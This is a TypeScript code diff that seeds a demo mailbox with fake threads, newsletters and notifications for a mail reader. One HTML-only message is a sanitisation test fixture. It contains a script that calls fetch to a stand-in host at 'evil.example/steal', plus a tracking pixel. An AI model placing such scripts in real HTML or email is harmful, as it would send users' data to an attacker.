@@ -15,6 +15,7 @@ import { ABOUT_LABEL as P_ABOUT_LABEL, BIO_LIMIT as P_BIO_LIMIT, NETWORK_META } 
 import { hubId } from '@dither-chat/protocol/ids';
 import type { AccountRow, Store } from './store.ts';
 import type { InprocAdapter } from './supervisor.ts';
+import type { FakeMailBackend, FakeInput } from './mail/fake.ts';
 
 type AccKey = 'dmain' | 'dalt' | 'sig' | 'mx' | 'wa';
 
@@ -1791,4 +1792,102 @@ export function applyDemoOverlay(store: Store) {
   store.setRule('keyword', 'dither-chat', 'all');
   store.setRule('keyword', 'zyan', 'all');
   store.db.query(`INSERT OR REPLACE INTO meta (key, value) VALUES ('demo_overlay', ?)`).run(String(Date.now()));
+}
+
+// ------------------------------------------------------------------ mail (docs/mail.md)
+
+/** The demo world's mail account: plain IMAP with the threading headers on summaries (dither-accounts' §13). */
+export const DEMO_MAIL_ACCOUNT = 'acc_demo-mail';
+const ME = { name: 'Zyan', email: 'zyan@dither.example' };
+
+/**
+ * A few people, a reply thread with quoted text, a Cc'd thread with an attachment, a newsletter and a notification
+ * (list headers), and an HTML-only message carrying a tracker and a script (which must never show or run).
+ */
+export function seedDemoMail(fake: FakeMailBackend, now = Date.now()) {
+  fake.addAccount(DEMO_MAIL_ACCOUNT, { kind: 'imap', label: 'Personal mail', email: ME.email, name: ME.name, opts: { ids: 'imap', threadIds: false, refs: true } });
+  const H = 3_600_000;
+  const D = 24 * H;
+  const sam = { name: 'Sam Rivera', email: 'sam@rivera.example' };
+  const alice = { name: 'Alice Chen', email: 'alice.chen@example.org' };
+  const jo = { name: 'Jo Park', email: 'jo@park.example' };
+  const theo = { name: 'Theo', email: 'theo@example.net' };
+  const mom = { name: 'Mom', email: 'mom@family.example' };
+  const id = (k: string) => `<demo-${k}@dither.example>`;
+  const put = (i: FakeInput) => fake.put(DEMO_MAIL_ACCOUNT, { flags: { seen: true }, ...i });
+
+  // Dinner: Sam asks, you answer (Sent), Sam writes back (unread), quoting you.
+  put({ messageId: id('dinner-1'), from: [sam], to: [ME], subject: 'Dinner on Friday?', receivedAt: now - 26 * H, text: 'Hey! Are you free after 7 on Friday? There is a new ramen place on Maple Street I want to try.\n\nSam' });
+  put({ mailboxId: 'Sent', messageId: id('dinner-2'), inReplyTo: id('dinner-1'), references: [id('dinner-1')], from: [ME], to: [sam], subject: 'Re: Dinner on Friday?', receivedAt: now - 20 * H, text: 'Yes, 7:30 works. Should I book a table?\n\nOn Thu, Sam Rivera <sam@rivera.example> wrote:\n> Hey! Are you free after 7 on Friday? There is a new ramen place on Maple Street I want to try.\n>\n> Sam' });
+  put({
+    messageId: id('dinner-3'),
+    inReplyTo: id('dinner-2'),
+    references: [id('dinner-1'), id('dinner-2')],
+    from: [sam],
+    to: [ME],
+    subject: 'Re: Dinner on Friday?',
+    receivedAt: now - 40 * 60_000,
+    flags: { seen: false },
+    text: 'Booked for 7:30, under Rivera. Their menu is here: https://ramen.example/menu/friday-specials-and-the-whole-very-long-list-of-noodles-and-broths-for-this-week?ref=newsletter&utm_source=mail\n\nSee you there!\n\n-- \nSam Rivera\n\nOn Fri, Zyan <zyan@dither.example> wrote:\n> Yes, 7:30 works. Should I book a table?\n>\n> On Thu, Sam Rivera <sam@rivera.example> wrote:\n>> Hey! Are you free after 7 on Friday?',
+  });
+
+  // The lease: Alice, with Jo in Cc and a PDF; you answered; Jo added a line.
+  put({ messageId: id('lease-1'), from: [alice], to: [ME], cc: [jo], subject: 'Lease renewal', receivedAt: now - 3 * D, text: 'Hi both,\n\nThe landlord sent the renewal. I signed page 2; could you sign pages 3 and 4 and send it back by the 15th?\n\nAlice', attachments: [{ id: 'att-lease', filename: 'lease-renewal.pdf', mime: 'application/pdf', size: 184_320, inline: false, contentId: null }] });
+  put({ mailboxId: 'Sent', messageId: id('lease-2'), inReplyTo: id('lease-1'), references: [id('lease-1')], from: [ME], to: [alice], cc: [jo], subject: 'Re: Lease renewal', receivedAt: now - 2 * D, text: 'Signed and scanned, it is attached. Thanks for sorting this out!\n\nOn Mon, Alice Chen <alice.chen@example.org> wrote:\n> The landlord sent the renewal.' });
+  put({ messageId: id('lease-3'), inReplyTo: id('lease-2'), references: [id('lease-1'), id('lease-2')], from: [jo], to: [alice, ME], subject: 'Re: Lease renewal', receivedAt: now - 9 * H, flags: { seen: false }, text: 'Done on my side too. Do we want to ask about the parking spot while we are at it?\n\nJo' });
+
+  // A newsletter and a notification: list headers say so.
+  put({
+    messageId: id('rust-weekly'),
+    from: [{ name: 'This Week in Rust', email: 'newsletter@rust-weekly.example' }],
+    to: [ME],
+    subject: 'This Week in Rust 512',
+    receivedAt: now - 5 * H,
+    flags: { seen: false },
+    bulk: { listId: '<weekly.rust-weekly.example>', unsubscribe: '<https://rust-weekly.example/unsubscribe>', precedence: 'bulk', autoSubmitted: null },
+    text: 'Hello and welcome to another issue of This Week in Rust!\n\nUpdates from the Rust project:\n• Async closures are stable\n• A new edition guide\n\nRead it on the web: https://rust-weekly.example/512',
+    html: '<h1>This Week in Rust 512</h1><p>Hello and welcome to another issue!</p>',
+  });
+  put({
+    messageId: id('gh-25'),
+    from: [{ name: 'GitHub', email: 'notifications@github.example' }],
+    to: [ME],
+    subject: 'Re: [libdither/dither-chat] Mail: read-only, end to end (#25)',
+    receivedAt: now - 3 * H,
+    flags: { seen: false },
+    bulk: { listId: '<dither-chat.libdither.github.example>', unsubscribe: null, precedence: 'list', autoSubmitted: null },
+    text: 'CI passed on feat/mail-read.\n\nReply to this email directly or view it on GitHub.',
+  });
+
+  // HTML only, with a tracking pixel and a script: the reader shows its text part, made from the HTML.
+  put({
+    messageId: id('shipped'),
+    from: [{ name: 'Maple Hardware', email: 'orders@maple-hardware.example' }],
+    to: [ME],
+    subject: 'Your order has shipped',
+    receivedAt: now - 30 * H,
+    flags: { seen: false },
+    text: null,
+    html:
+      '<html><head><style>p{color:#333}</style><script>document.title="hacked";fetch("https://evil.example/steal")</script></head><body>' +
+      '<p>Good news: <b>your order #4471 has shipped</b>.</p><p>It should arrive on Tuesday.</p>' +
+      '<p><a href="https://maple-hardware.example/track/4471">Track your parcel</a></p>' +
+      '<img src="https://tracker.example/open.gif?u=demo" width="1" height="1" alt="">' +
+      '<script>alert("never")</script></body></html>',
+  });
+
+  // Older, read: Theo, and what you sent Mom.
+  put({ messageId: id('climb'), from: [theo], to: [ME], subject: 'Climbing on Sunday', receivedAt: now - 6 * D, text: 'Gym at 10 on Sunday? I can bring the spare harness.\n\nTheo' });
+  put({ mailboxId: 'Sent', messageId: id('photos'), from: [ME], to: [mom], subject: 'Photos from the weekend', receivedAt: now - 8 * D, text: 'Here are the photos from the lake. The one of the dog is my favourite.' });
+  put({ messageId: id('photos-re'), inReplyTo: id('photos'), references: [id('photos')], from: [mom], to: [ME], subject: 'Re: Photos from the weekend', receivedAt: now - 7 * D, text: 'Lovely! Can you print the dog one for me?\n\nLove, Mom' });
+  for (let i = 0; i < 12; i++)
+    put({
+      messageId: id(`digest-${i}`),
+      from: [{ name: 'Maple Street Library', email: 'news@library.example' }],
+      to: [ME],
+      subject: `New arrivals, week ${40 - i}`,
+      receivedAt: now - (9 + i) * D,
+      bulk: { listId: '<arrivals.library.example>', unsubscribe: '<mailto:leave@library.example>', precedence: 'bulk', autoSubmitted: null },
+      text: `This week's new books and events at the library (week ${40 - i}).`,
+    });
 }
